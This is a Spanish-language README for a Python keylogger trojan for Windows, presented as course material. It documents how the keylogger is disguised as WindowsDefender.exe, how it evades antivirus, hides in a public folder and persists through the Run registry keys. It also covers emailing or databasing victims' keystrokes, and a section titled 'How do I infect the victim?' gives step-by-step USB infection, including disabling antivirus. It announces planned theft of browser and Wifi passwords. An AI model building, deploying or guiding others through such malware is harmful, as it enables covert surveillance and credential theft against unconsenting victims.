````
█▀ █▀█ █▄█   ▀█▀ █▀█ █▀█ ░░█ ▄▀█ █▄░█   █▄▀ █▀▀ █▄█ █░░ █▀█ █▀▀ █▀▀ █▀▀ █▀█
▄█ █▀▀ ░█░   ░█░ █▀▄ █▄█ █▄█ █▀█ █░▀█   █░█ ██▄ ░█░ █▄▄ █▄█ █▄█ █▄█ ██▄ █▀▄ v4.0     
````
---
---
* __Nombre:__ `Spy Trojan KeyLogger`
* __Documentación:__ `22/05/2020`
* __Versión:__ `4.0`
* __Estado:__` Estable`
* __Plataforma:__` Windows 7, 8.1 y 10`
* __Lenguaje:__` Python 3.8`


__Nota importante:__ Esta herramienta tiene como proposito general y de uso exclusivo para aprendizaje, se creó como parte de un curso Online de hacking de __"Seguridad de sistemas informáticos"__, no me hago responsable de un posible mal uso de ésta herramienta.

Las razones por las cuales existen los Keyloggers, tienen como fin la seguridad de una empresa ya sea que estén viendo qué está haciendo el personal, cómo interactúan sus personas en las computadoras o que los atacantes intenten obtener información confidencial, como información de inicio de sesión u otros datos confidenciales. Este programa simplemente toma cada pulsación de tecla ingresada en el teclado y luego envía el archivo de registro por correo electrónico cada 2 horas.

---
---
# Carpeta Principal
![Archivos](https://i.imgur.com/PVN64Kv.png)
- `Doc` = Documentación de como perzonalizar el keylogger `CustomKey.md`
- `Compile.bat`    = Convierte el script `*.py` a `*.exe`
- `DataCompartir.txt`    = Pequeña descripción del keylogger
- `Ejecutar.bat`    = Ejecuta el script - [para pruebas]
- `icon.ico`    = Icono Windows Defender
- `LICENCE` = Licencia 
- `README.md`= Documentación
- `version.txt` = Información detalla de conversión `.py` a `.exe`
- `WindowsDefender.exe` = Keylogger Compilado `4.0`
- `WindowsDefender.py` = Código fuente del Keylogger
---
---
# Caracteristicas
- __Indetectable Antivirus:__ Windows Defender `22/05/2020`, Avast, ESET NOD32
- __Envío por Gmail:__ Envía el registro de teclas por Gmail en un `reg.k`.

  ![Correo ejemplo del Keylogger](https://i.imgur.com/HCyUK2M.png)

- __Recibe datos por varios correos:__ Hay una posibilidad de agregar 1 o más correos, y así el registro de teclas se envíe a varios correos a la vez.

    ````py
    #Correos que recibirán el registro de teclas.
    def ReceiveE():
        return ["Recibe1@gmail.com", "Recibe2@hotmail.com", "Recibe3@yahoo.com"]   # MultiCorreo
        #return ["CorreoReceptor@gmail.com"]                                         #Monocorreo        
    ````
- __Conexión a una base de datos MySQL:__ Se enviarán los datos del registro mediante una base de datos, más información [Aquí]()


- __Verifica conexión a internet:__ El keylogger verifica si la computadora está conectada a internet, y si ese es el caso envía los datos, en caso contrario, no lo envía,
- __Intervalo de tiempo personalizado:__ Usted puede elegir un intervalo de tiempo personalizado, en la cual desea recibir el registro de teclas. `No se recomienta que sea un intervalo muy pequeño, ya que el servidor de mensajería de google, bloqueará la cuenta por 1 día,  por eso el tiempo de intervalo de envío escogida es de 2 Horas, este tiempo transcurre desde el  inicio del script`
    ````py
    def timeSend(): # Tiempo de envío perzonalizado
        return 120    # Minutos                 <= Escoja su tiempo en minutos
    ````
- __Obtención de datos a prueba de errores:__ En otros keylogger al momento de enviar el `reg.k`, éste proceso demora entre 3 a 5 segundos, y en ese transcurso de tiempo el keylogger no obtiene ninguna información de teclas oprimidas, en éste keylogger, ese error está solucionado.
- __Segundo plano:__ Este keylogger, al ejecutarse en la linea de comando, sí mostrará una consola, solo por detalles de debuggeo, pero al ser compilada de `*.py` a `*.exe` el ejecutable resultante se ejecutará en segundo plano

    ![Segundo plano](https://i.imgur.com/DFAf2Tw.png)

- __Disfraz:__ Al momento de ser convertido de `*.py a *.exe`. El Keylogger será disfrazado como `WindowsDefender.exe` con el ícono y la información del programa.
    ![ExeCompilado](https://i.imgur.com/TlBEAaS.png)

    ![StartUP Info](https://i.imgur.com/bkGSFQC.png)

    ![Info](https://i.imgur.com/MQAiVnJ.png) 
    ![Info](https://i.imgur.com/mTBByRy.png)

- __Oculto:__ El Keylogger al iniciar se copia (Solo si ya está en un archivo *exe) a la carpeta `"C:\Users\Public\Security\Windows Defender\"` , y en esa carpeta encuentras el archivo `reg.k`.

- __Iniciar automaticamente con el sistema:__ Modifica el registro de windows, [más información aquí.](https://github.com/SebastianEPH/SpyTrojan_Keylogger#m%C3%A9todo-de-infecci%C3%B3n)
    
    ![StartUp](https://i.imgur.com/xh91bR5.png)

- __Segundo Gmail en caso de Error:__ En casó el correo principal sea bloqueada o tenga x problemas, se usará un segundo correo.


## Caracteristicas que se agregarán en futuras actualizaciones:  
- __Soporte de envió a otros buzones de correo:__ Se insertará un soporte para poder usar Outlook, yahoo u otros servicios de correo 
- __Conexión FTP:__ Envía el archivo `reg.k` vía FTP.
- __Envía datos mediante FTP:__ enviará documentos, fotos y videos mediante una conexión FTP, en segundo plano.
- __Envio mediante Bot Telegram:__ Soporte de envio automatico del registro de teclas a un bot especifico.
- __Contraseñas de Wifi:__ Obtiene contraseñas guardadas en una laptop o PC
- __Portapapeles:__ Obtiene el texto del portapapeles.
- __Obtiene contraseñas guardadas en Google Chrome:__ Obtiene todas las contraseñas guardadas de Google chrome .

## Uso de Recursos de la PC
El programa se repite 2 veces ya que ésta utiza 2 hilos de ejecución

![Uso del CPU y RAM](https://i.imgur.com/DFAf2Tw.png)

---
---
# Proceso de preparación:

__NOTA:__ Como requisito mínimo para el aprendizaje de ésta herramienta es saber programar en __Python básico__.

Requerimiento de paquetes de `Python3.8`:
- `import pynput`
- `import getuser`
- `import datetime`
- `import os`
- `import time`
- `import yagmail`
- `import socket`
- `import threading`
- `import pyinstaller`

## Envió Mediante Gmail
1. Es de suma urgencia habilitar el acceso a apps menos seguras de google, la cual lo puedes hacer desde éste [link](https://myaccount.google.com/lesssecureapps).  `En caso no lo habilites, el keylogger no podrá iniciar sesión en su Gmail`
2. Use  `git clone https://github.com/SebastianEPH/SpyTrojan_Keylogger.git` para descargar el repositorio en su computadora.

3. Abra el archivo `WindowsDefender.py` en su editor de texto.
4. Entre al codigo y busca la `ZONA CUSTOM BÁSICA` y modifique el `Correo primario` y el `Correo segundario`, luego rellene el o los `Correos que receptores`
````py
# ************************************  FIN ZONA CUSTOM BÁSICA   *********************************

# Correo de envío [Primaria] 
def emailP():                   # <<== Cambia éste correo
    return "correo1@gmail.com" 
def passP():                    # <<== Contraseña del correo
    return "contra1"
# Correo de envío [Segundaria]     <=> Solo si hay algún problema de envío con el correo Principal
def emailS():                   # <<== Cambia éste correo
    return "correo2@gmail.com"
def passS():                   # <<== Contraseña del correo 
    return "pass2"

def timeSend(): # Tiempo de envío perzonalizado
    return 120 #Minutos                 <= Escoja su tiempo en minutos

#Correos que recibirán el registro de teclas.
def ReceiveE():
    #return ["Recibe1@gmail.com", "Recibe2@hotmail.com", "Recibe3@yahoo.com"]   # MultiCorreo
    return ["CorreoReceptor@gmail.com"]                                         # MonoCorreo

# ************************************  FIN ZONA CUSTOM BÁSICA   *********************************

````
[Si usted desea modificar el keylogger lea la siguiente documentación aquí.](Doc/CustomKey.md)

## Envío mediante Base de Datos |MySQL|

1. Debes crearte una cuenta gratuita en [CleverCloud](https://www.clever-cloud.com/en/), cabe destacar que solo tenemos 10MB de almacenamiento, se recomienda, vaciar los datos cada vez que podamos, o utilizar otra base de datos.

    ![Crear nueva base de datos ](https://i.imgur.com/EtkWgZe.png)
2. Select a MySQL =>

    ![Select Type DataBASE](https://i.imgur.com/qyaM5Rv.png)
3. Creamos una Base de Datos gratuita o pagamos por el servicio, damos a `NEXT`.
    
    ![Create Free and Buy](https://i.imgur.com/nFUtGnY.png)
4. Escribirmos el nombre para reconocer la base de datos.
    ![Name DataBase](https://i.imgur.com/7KOUQip.png)
5. Obtenemos los datos de conexión.
    ![Clevercloud](https://i.imgur.com/JdGTqvB.png)
6. Descargamos e instalamos [HeidiSQL](https://www.heidisql.com/download.php)y creamos una nueva sesión.
    
    ![](https://i.imgur.com/oOAiFL2.png)
7. Creamos una nueva tabla con el Nombre= `keylog` y guardamos.

    ![](https://i.imgur.com/8mcP594.png)
8. Creamos los siguientes datos con los siguiente typos de datos:
    ````c
    l_id        // INT          [Llave Primaria]  (Autoincremento)
    l_user      // CHAR         [50 Caracteres] 
    l_time      // CHAR         [50 Caracteres]
    l_log       // MEDIUMTEXT   [Acepta 16.777.215 Caracteres]
                // LONGTEXT     [Acepta 4,292.967.295 Caracteres - Aprox 4GB de Texto]
    ````
    ![](https://i.imgur.com/TrGVRMB.png)
9. 


10. En el apartado Data, podrá ver el registro de teclas por día
    ![Ver log](https://i.imgur.com/o2w2WMi.png)

11. Podemos observar la base de datos con el registro de teclas obtenida.

    ![Fin](https://i.imgur.com/X4MxCeA.png)




# Método de infección:
___¿Cómo infecto a la victima?___

![Final files](https://i.imgur.com/TlBEAaS.png)

__Nota:__ No cambiar de nombre al archivo `WindowsDefender.exe`, si usted le cambia el nombre, el Keylogger quedará obsoleto.
- Usten guardará el archivo en un USB.
- Conectará el __USB__ a la __[PC]__ a infectar.
- Se recomienda desactivar el antivirus o agregar una exclusión en al siguiente ruta: `"C:\Users\Public\Security\Windows Defender"`.
- Lo siguiente es ejecutar el archivo `WindowsDefender.exe` en el USB, el Keylogger se replicará en la siguiente ruta `"C:\Users\Public\Security\Windows Defender"`, Se recomienda no sacar el USB al instante ya que el `Keylogger` se estará replicando en la ruta.

__NOTA:__ Al ejecutar el archivó, ésta automaticamente modificará el registro de windows para que se inicie siempre al prender la computadora.

El Keylogger tKeyloggerará de modificar la siguiente ruta del registro `"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run"` por lo cual necesitará permisos de administrador, por ende se recomienda que la primera ejecución se realice con permisos de administrador, en caso de que no lo ejecute con permisos de administrador, el Keylogger modificará la siguiente ruta `"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"`

__Explicación:__ 
* `HKEY_LOCAL_MACHINE:` El Keylogger se ejecutará en todos los usuarios exitentes y los nuevos usuarios de la computadora
* `HKEY_CURRENT_USER:` El Keylogger solo se ejecutará en el usuario actual, si se llegará a crear otro usuario, el Keylogger Solo funcionará en el usuario principal
___
___

<!-- Creador  -->
---
## By SebastianEPH
<!--- [Website](https://sebastianeph.github.io/) -->
- [Github](https://github.com/SebastianEPH)
- [Linkedin](https://www.linkedin.com/in/sebastianeph/)
- [Telegram](https://t.me/sebastianeph)
- [Facebook](https://www.facebook.com/SebastianEPH)